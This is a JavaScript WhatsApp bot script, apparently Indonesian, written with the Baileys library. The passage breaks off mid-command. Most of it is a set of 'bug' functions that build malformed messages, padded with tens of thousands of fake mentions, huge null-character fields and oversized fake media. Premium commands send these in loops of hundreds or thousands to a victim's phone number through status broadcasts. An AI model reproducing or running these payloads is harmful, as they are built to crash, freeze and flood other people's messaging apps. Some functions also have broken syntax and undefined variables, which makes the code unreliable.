require('./config')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const util = require('util')
const chalk = require('chalk')
const crypto = require("crypto");
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = rikz = async (rikz, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await rikz.decodeJid(rikz.user.id);
const premuser = JSON.parse(fs.readFileSync("./system/database/premium.json"));
const owneruser = JSON.parse(fs.readFileSync("./system/database/owner.json"));
const isOwner= [botNumber, ...global.owner, ...owneruser].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!rikz.public && !isOwner) return;
//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await rikz.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
//======================
if (m.message) {
rikz.readMessages([m.key]);
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold("📩 NEW MESSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Dari:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
//FUNCTION BUG
async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await rikz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
//bulldozer v2
async function bulldozer1GB(target) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = image/webp;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true",
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: jid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent( jid, message, {});

  await rikz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
//Protocolbug6
async function protocolbug6(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "VALORES ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "TREDICT INVICTUS", // GAUSAH GANTI KOCAK ERROR NYALAHIN GUA
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @tamainfinity )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await rikz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await rikz.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}
//Protocolbug7
async function protocolbug7(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await rikz.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await rikz.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
//protocolbug8 
async function protocolbug8(target, mention) {
    const albumMsg = {
        protocolMessage: {
            type: 29,
            editedMessage: {
                message: {
                    imageMessage: {
                        mimetype: "image/jpeg",
                        caption: "Xxx",
                        fileSha256: "OEVKKnU1J8ZK8cGJcdyi6wFwHboRuTPaDQ6vKx7DYVk=",
                        fileEncSha256: "TYiYlQ6UJvOftZ6+kACcU0ht+Zn6Il7Ej8C+6Vcs4kc=",
                        mediaKey: "7q+GUK8W+PNr+dSyOcwz3MPPBhN3O+E0EMKxV+2W9h8=",
                        directPath: "/v/t62.7114-24/10000000_1397981774398456_2140897391867292534_n.enc?ccb=11-4&oh=01_Q5Aa1vFxUgvlLsXZ5...&oe=68366F18&_nc_sid=5e03e0",
                        fileLength: "17000",
                        mediaKeyTimestamp: "1748373411"
                    }
                }
            }
        }
    };

    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const album = generateWAMessageFromContent(target, albumMsg, {});
    await rikz.relayMessage("status@broadcast", album.message, {
        messageId: album.key.id,
        statusJidList: [target]
    });

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Dyemmm" + "ោ៝".repeat(10000),
        title: "XxX",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "Iwanna"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "Iwanna",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});

    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(target, audioMessage, {});

    for (const msg of [msg1, msg2, msg3]) {
        await rikz.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await rikz.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}
async function albumdelay(target) {
  const mediaItems = Array.from({ length: 10 }, (_, i) => ({
    stickerMessage: {
      url: `https//speed.hetzner.de/800MB.bin?i=${i}`,
      fileSha256: "MMMQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
      fileEncSha256: "ZZZBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=",
      mediaKey: "K3YCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=",
      mimetype: "image/webp",
      directPath: `/stiker/fakepath_${i}.enc`,
      fileLength: { low: 2147483647, high: 372, unsigned: true },
      mediaKeyTimestamp: 1715999999,
      stickerSentTs: 1716004040404,
      isAnimated: false,
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        mentionedJid: Array.from({ length: 3000 }, () =>
          "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
        )
      }
    },
    imageMessage: {
      url: `https://speed.hetzner.de/800MB.bin?i=${i}`,
      mimetype: "image/jpeg",
      fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
      fileEncSha256: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=",
      mediaKey: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=",
      directPath: `/media/fakepath_${i}.enc`,
      fileLength: { low: 104857600, high: 0, unsigned: true },
      mediaKeyTimestamp: { low: 999999999, high: 0, unsigned: false },
      jpegThumbnail: Buffer.from([]),
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        mentionedJid: Array.from({ length: 3000 }, () =>
          "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
        )
      }
    },
    documentMessage: {
      url: `https://speed.hetzner.de/800MB.bin?i=${i}`,
      mimetype: "application/pdf",
      fileSha256: "DEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEAD=",
      fileEncSha256: "BEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEFBEEF=",
      mediaKey: "C0FFEE00C0FFEE00C0FFEE00C0FFEE00C0FFEE00C0FF=",
      directPath: `/document/fakefile_${i}.enc`,
      fileLength: { low: 999999999, high: 0, unsigned: true },
      mediaKeyTimestamp: { low: 999999999, high: 0, unsigned: false },
      title: `voulop${i}`,
      pageCount: 9999,
      externalAdReply: {
        showAdAttribution: true,
        title: "\u200E".repeat(15000),
        body: "\u200E".repeat(15000),
        mediaUrl: "",
        mediaType: 1,
        thumbnail: Buffer.from([]),
        sourceUrl: "",
        renderLargerThumbnail: true
      }
    }
  }));

  const album = {
    viewOnceMessage: {
      message: {
        albumMessage: {
          messageList: mediaItems
        }
      }
    }
  };

  const doc = {
    viewOnceMessage: {
      message: {
        documentMessage: mediaItems[0].documentMessage
      }
    }
  };

  const stiker = {
    viewOnceMessage: {
      message: {
        stickerMessage: mediaItems[0].stickerMessage
      }
    }
  };

  const msg = generateWAMessageFromContent(target, {
    ...doc,
    ...stiker,
    ...album
  }, {
    quoted: null,
    messageId: "Obrien" + Date.now()
  });

  await rikz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
async function VampBroadcast(target, mention) {
  const delaymention = Array.from({ length: 50000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "assalamualaikum",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "Dont Bothering Me Bro!!!",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await rikz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  // **Cek apakah mention true sebelum menjalankan relayMessage**
  if (mention) {
    await rikz.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "soker tai" },
            content: undefined,
          },
        ],
      }
    );
  }
}
//======================
switch (command) {
//case bug
case "xdelaynew": {
if (!isOwner && !isPremium) return m.reply('Khusus Premium');
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙋𝙧𝙤𝙨𝙚𝙨 𝙨𝙚𝙣𝙩 ${prefix+command} 𝙩𝙤 ${target}`);

setTimeout(async () => {
    try {
        m.reply(`┏━━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃╺╺╸〢𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 𝐒𝐄𝐍𝐓 𝐁𝐔𝐆 〢╺╸╺
┃ 𝐓𝐚𝐫𝐠𝐞𝐭: ${target}
┃ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 : ${command}
┃ 𝐖𝐚𝐫𝐧𝐢𝐧𝐠 : Jeda 5 menit tod
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
    } catch (error) {
        console.error("Error editing message:", error);
    }
}, 3000);

          for (let i = 0; i < 8888; i++) {+
            await VampBroadcast(target, true);
            await sleep(1000);
            await VampBroadcast(target, true);
            await VampBroadcast(target, true);
            await sleep(1000);
            await albumdelay(target);
            await albumdelay(target);
            await sleep(1000);
            await albumdelay(target);
            await sleep(5000);
            console.log(chalk.red("Successfully sent delay new"))
            
}

    }

  

break;
//======================
case "proto6": {
    
if (!isOwner && !isPremium) return m.reply('Khusus Premium');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙋𝙧𝙤𝙨𝙚𝙨 𝙨𝙚𝙣𝙩 ${prefix+command} 𝙩𝙤 ${target}`);

setTimeout(async () => {
    try {
        m.reply(`┏━━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃╺╺╸〢𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 𝐒𝐄𝐍𝐓 𝐁𝐔𝐆 〢╺╸╺
┃ 𝐓𝐚𝐫𝐠𝐞𝐭: ${target}
┃ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 : ${command}
┃ 𝐖𝐚𝐫𝐧𝐢𝐧𝐠 : Jeda 5 menit tod
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
    } catch (error) {
        console.error("Error editing message:", error);
    }
}, 3000);

          for (let i = 0; i < 888; i++) {
            await protocolbug6(target);
            await sleep(1500);
            await protocolbug6(target);
            await protocolbug6(target);
            await sleep(2000);
            await protocolbug6(target);
            await protocolbug6(target);
            await sleep(1500);
            await protocolbug6(target);
            await sleep(4000);
            console.log(chalk.red("Successfully sent protocolbug6"))
            
}
    }
  
break;
//======================
case "proto7": {
    
if (!isOwner && !isPremium) return m.reply('Khusus Premium');
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙋𝙧𝙤𝙨𝙚𝙨 𝙨𝙚𝙣𝙩 ${prefix+command} 𝙩𝙤 ${target}`);

setTimeout(async () => {
    try {
        m.reply(`┏━━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃╺╺╸〢𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 𝐒𝐄𝐍𝐓 𝐁𝐔𝐆 〢╺╸╺
┃ 𝐓𝐚𝐫𝐠𝐞𝐭: ${target}
┃ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 : ${command}
┃ 𝐖𝐚𝐫𝐧𝐢𝐧𝐠 : Jeda 5 menit tod
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
    } catch (error) {
        console.error("Error editing message:", error);
    }
}, 3000);

          for (let i = 0; i < 888; i++) {
            await protocolbug7(target);
            await sleep(1500);
            await protocolbug7(target);
            await protocolbug6(target);
            await sleep(2000);
            await protocolbug7(target);
            await protocolbug7(target);
            await sleep(1500);
            await protocolbug7(target);
            await sleep(4000);
            console.log(chalk.red("Successfully sent protocolbug7"))
           
}
    }
  
break;
//======================
case "proto8": {
    
if (!isOwner && !isPremium) return m.reply('Khusus Premium');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙋𝙧𝙤𝙨𝙚𝙨 𝙨𝙚𝙣𝙩 ${prefix+command} 𝙩𝙤 ${target}`);

setTimeout(async () => {
    try {
